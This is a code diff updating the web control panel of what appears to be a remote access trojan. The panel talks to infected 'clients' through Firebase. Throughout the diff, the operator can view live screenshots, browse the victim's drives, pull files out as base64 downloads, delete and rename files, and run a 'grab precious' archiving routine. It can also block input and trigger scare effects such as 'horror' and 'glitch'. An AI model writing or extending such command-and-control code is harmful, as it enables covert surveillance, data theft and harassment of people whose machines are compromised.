@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Admin Panel v5.0</title>
+    <title>Remote Admin Panel v5.5</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
     <style>
@@ -27,14 +27,11 @@
 </head>
 <body>
 <div class="d-flex">
-    <!-- Боковая панель клиентов -->
     <div class="sidebar">
         <h4 class="text-success"><i class="bi bi-pc-display"></i> Клиенты</h4>
         <div id="clientList"></div>
         <div class="mt-2 small" id="connectionStatus"></div>
     </div>
-
-    <!-- Основная панель -->
     <div class="flex-grow-1 p-3">
         <div id="mainContent">
             <div class="text-center text-secondary mt-5">
@@ -62,13 +59,12 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 let currentClient = null;
-let screenUnsub = null;
-let fileListUnsub = null;
+let screenUnsub = null, fileListUnsub = null, fileTransferUnsub = null;
 let clientsData = {};
 let clientElements = {};
-let currentPath = "C:\\"; // начальный путь для файлового менеджера
+let currentPath = "C:\\";
 
-// ========== Работа со списком клиентов ==========
+// Список клиентов
 onValue(ref(db, 'clients'), (snap) => {
     const data = snap.val();
     const list = document.getElementById('clientList');
@@ -111,27 +107,27 @@ onValue(ref(db, '.info/connected'), (snap) => {
     }
 });
 
-// ========== Выбор клиента ==========
 function selectClient(id) {
-    if (currentClient && clientElements[currentClient]) {
+    if (currentClient && clientElements[currentClient])
         clientElements[currentClient].classList.remove('active');
-    }
     currentClient = id;
     if (clientElements[id]) clientElements[id].classList.add('active');
+    // Отписка от предыдущих слушателей
     if (screenUnsub) { screenUnsub(); screenUnsub = null; }
     if (fileListUnsub) { fileListUnsub(); fileListUnsub = null; }
+    if (fileTransferUnsub) { fileTransferUnsub(); fileTransferUnsub = null; }
     renderPanel(id);
-    // Подписка на скриншот
+    // Скриншот
     screenUnsub = onValue(ref(db, `clients/${id}/screenshot`), (snap) => {
         const img = document.getElementById('screenshotImg');
         if (img) img.src = snap.val() ? `data:image/jpeg;base64,${snap.val()}` : '';
     });
-    // Подписка на результат действий с файлами
+    // Результат действий с файлами
     onValue(ref(db, `clients/${id}/file_action_result`), (snap) => {
         const val = snap.val();
         if (val) addLog(`[FileAction] ${val}`);
     });
-    // Подписка на статус граббера
+    // Статус граббера
     onValue(ref(db, `clients/${id}/grab_status`), (snap) => {
         const val = snap.val();
         if (val) {
@@ -139,7 +135,20 @@ function selectClient(id) {
             addLog(`[Grab] ${val}`);
         }
     });
-    // По умолчанию запросим список файлов C:\
+    // Скачанные файлы (file_transfer)
+    fileTransferUnsub = onValue(ref(db, `clients/${id}/file_transfer`), (snap) => {
+        const val = snap.val();
+        if (val && val.data) {
+            addLog(`[Download] Получен файл: ${val.name}`);
+            const link = document.createElement('a');
+            link.href = `data:application/octet-stream;base64,${val.data}`;
+            link.download = val.name;
+            link.click();
+            // Очищаем file_transfer
+            set(ref(db, `clients/${id}/file_transfer`), null);
+        }
+    });
+    // По умолчанию открываем C:\
     requestFileList('C:\\');
 }
 
@@ -150,23 +159,18 @@ function addLog(msg) {
     log.scrollTop = log.scrollHeight;
 }
 
-// Пресеты (как раньше)
-const PRESETS_KEY = 'remoteControlPresets';
+// Пресеты (7 слотов)
+const PRESETS_KEY = 'remoteControlPresets_v5';
 function loadPresets() {
     try {
-        const raw = localStorage.getItem(PRESETS_KEY);
-        return raw ? JSON.parse(raw) : Array(7).fill({ name: '', command: '', payload: '' });
-    } catch (e) {
-        return Array(7).fill({ name: '', command: '', payload: '' });
-    }
+        return JSON.parse(localStorage.getItem(PRESETS_KEY)) || Array(7).fill({ name: '', command: '', payload: '' });
+    } catch { return Array(7).fill({ name: '', command: '', payload: '' }); }
 }
 function savePresets(presets) { localStorage.setItem(PRESETS_KEY, JSON.stringify(presets)); }
 
-// ========== Рендер основной панели с табами ==========
 function renderPanel(id) {
     const main = document.getElementById('mainContent');
     const presets = loadPresets();
-
     let presetsHtml = '';
     for (let i = 0; i < 7; i++) {
         const p = presets[i];
@@ -226,11 +230,14 @@ function renderPanel(id) {
                 <div class="mt-3">
                     <h5>Быстрые команды</h5>
                     <div class="d-flex flex-wrap gap-2">
-                        <button class="btn btn-outline-warning btn-hacker" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
+                        <button class="btn btn-outline-warning" onclick="sendCmd('rickroll')"><i class="bi bi-music-note"></i> Rickroll</button>
                         <button class="btn btn-outline-warning" onclick="sendCmd('crazy_mouse')"><i class="bi bi-mouse"></i> Crazy Mouse</button>
                         <button class="btn btn-outline-info" onclick="sendCmd('screenshot')"><i class="bi bi-camera"></i> Screenshot</button>
                         <button class="btn btn-outline-primary" onclick="sendCmd('open_calc')"><i class="bi bi-calculator"></i> Open Calc</button>
                         <button class="btn btn-outline-light" onclick="sendCmd('swap_mouse')"><i class="bi bi-arrow-left-right"></i> Swap Mouse</button>
+                        <button class="btn btn-outline-danger" onclick="sendCmd('horror')"><i class="bi bi-emoji-dizzy"></i> Horror</button>
+                        <button class="btn btn-outline-danger" onclick="sendCmd('glitch')"><i class="bi bi-bug"></i> Glitch</button>
+                        <button class="btn btn-outline-danger" onclick="sendCmd('crosses')"><i class="bi bi-x-lg"></i> Crosses</button>
                     </div>
                     <div class="mt-2 d-flex gap-2">
                         <button class="btn btn-outline-danger" onclick="sendBlockInput(true)"><i class="bi bi-lock"></i> Включить блокировку</button>
@@ -289,7 +296,7 @@ function renderPanel(id) {
         </div>
     `;
 
-    // Обработчики для пресетов
+    // Обработчики пресетов
     document.querySelectorAll('.preset-name, .preset-cmd, .preset-payload').forEach(el => {
         el.addEventListener('input', () => updatePreset(el.dataset.index));
     });
@@ -297,23 +304,20 @@ function renderPanel(id) {
         btn.addEventListener('click', () => runPreset(btn.dataset.index));
     });
 
-    // Активируем табы Bootstrap
-    const tabTriggerList = document.querySelectorAll('#mainTabs button');
-    tabTriggerList.forEach(tab => {
+    // Табы (Bootstrap)
+    const tabTriggers = document.querySelectorAll('#mainTabs button');
+    tabTriggers.forEach(tab => {
         tab.addEventListener('click', function(e) {
             e.preventDefault();
             const target = this.dataset.bsTarget;
-            // Скрываем все панели
             document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('show', 'active'));
-            // Показываем нужную
             document.querySelector(target).classList.add('show', 'active');
-            // Обновляем активность табов
-            tabTriggerList.forEach(t => t.classList.remove('active'));
+            tabTriggers.forEach(t => t.classList.remove('active'));
             this.classList.add('active');
         });
     });
 
-    // Подписываемся на file_list
+    // Подписка на file_list
     if (fileListUnsub) fileListUnsub();
     fileListUnsub = onValue(ref(db, `clients/${currentClient}/file_list`), (snap) => {
         const val = snap.val();
@@ -327,9 +331,7 @@ function renderPanel(id) {
                 currentPath = data.current_path;
                 document.getElementById('currentPathDisplay').innerText = currentPath;
                 populateFileTable(data.items);
-            } catch (e) {
-                console.error(e);
-            }
+            } catch (e) { console.error(e); }
         }
     });
 }
@@ -346,12 +348,11 @@ function populateFileTable(items) {
             <td>${item.is_dir ? 'Папка' : 'Файл'}</td>
             <td>${item.is_dir ? '' : formatSize(item.size)}</td>
             <td>
-                ${item.is_dir ? '' : `<button class="btn btn-sm btn-outline-info me-1" onclick="downloadFile('${item.name}')"><i class="bi bi-download"></i></button>`}
-                <button class="btn btn-sm btn-outline-danger me-1" onclick="deleteItem('${item.name}')"><i class="bi bi-trash"></i></button>
-                <button class="btn btn-sm btn-outline-light" onclick="renameItem('${item.name}')"><i class="bi bi-pencil"></i></button>
+                ${item.is_dir ? '' : `<button class="btn btn-sm btn-outline-info me-1" onclick="downloadFile('${item.name}')"><i class="bi bi-download"></i> Скачать</button>`}
+                <button class="btn btn-sm btn-outline-danger me-1" onclick="deleteItem('${item.name}')"><i class="bi bi-trash"></i> Удалить</button>
+                <button class="btn btn-sm btn-outline-light" onclick="renameItem('${item.name}')"><i class="bi bi-pencil"></i> Переим.</button>
             </td>
         `;
-        // Двойной клик для входа в папку
         if (item.is_dir) {
             row.addEventListener('dblclick', () => {
                 requestFileList(currentPath + '\\' + item.name);
@@ -371,7 +372,6 @@ function requestFileList(path) {
     if (!currentClient) return;
     sendCmd('list_files', path);
 }
-
 function goUpFolder() {
     if (!currentPath) return;
     const parent = currentPath.split('\\').slice(0, -1).join('\\') || 'C:\\';
@@ -380,42 +380,22 @@ function goUpFolder() {
 
 function downloadFile(name) {
     const filePath = currentPath + '\\' + name;
-    const payload = JSON.stringify({ action: 'download', target: filePath });
-    sendCmd('file_action', payload);
-    // После этого нужно ждать появления file_download в базе и скачать
-    addLog(`Запрос на скачивание: ${filePath}`);
-    // Подпишемся временно на file_download
-    const unsub = onValue(ref(db, `clients/${currentClient}/file_download`), (snap) => {
-        const val = snap.val();
-        if (val && val.data) {
-            // Инициируем загрузку в браузере
-            const link = document.createElement('a');
-            link.href = `data:application/octet-stream;base64,${val.data}`;
-            link.download = val.name;
-            link.click();
-            addLog(`Файл ${val.name} загружен`);
-            unsub(); // отписываемся
-            // Очищаем file_download
-            set(ref(db, `clients/${currentClient}/file_download`), null);
-        }
-    });
+    sendCmd('file_action', JSON.stringify({ action: 'download', target: filePath }));
+    addLog(`Запрос на скачивание: ${name}`);
 }
-
 function deleteItem(name) {
     if (!confirm(`Удалить ${name}?`)) return;
     const filePath = currentPath + '\\' + name;
-    const payload = JSON.stringify({ action: 'delete', target: filePath });
-    sendCmd('file_action', payload);
-    // Перезапросить список через некоторое время
-    setTimeout(() => requestFileList(currentPath), 1500);
+    sendCmd('file_action', JSON.stringify({ action: 'delete', target: filePath }));
+    addLog(`Удаление: ${name}`);
+    // Обновление списка произойдёт автоматически после удаления на стороне Python
 }
-
 function renameItem(oldName) {
     const newName = document.getElementById('renameInput').value.trim();
     if (!newName) return alert('Введите новое имя');
     const oldPath = currentPath + '\\' + oldName;
-    const payload = JSON.stringify({ action: 'rename', target: oldPath, new_name: newName });
-    sendCmd('file_action', payload);
+    sendCmd('file_action', JSON.stringify({ action: 'rename', target: oldPath, new_name: newName }));
+    addLog(`Переименование: ${oldName} -> ${newName}`);
     setTimeout(() => requestFileList(currentPath), 1500);
 }
 
@@ -426,7 +406,7 @@ function grabPrecious() {
     document.getElementById('grabStatus').innerText = 'Идёт архивация...';
 }
 
-// ========== Универсальная отправка команд ==========
+// Универсальные отправщики
 window.sendCmd = function(cmd, payload = '') {
     if (!currentClient) return alert('Выберите клиента!');
     const updates = { [`clients/${currentClient}/command`]: cmd };
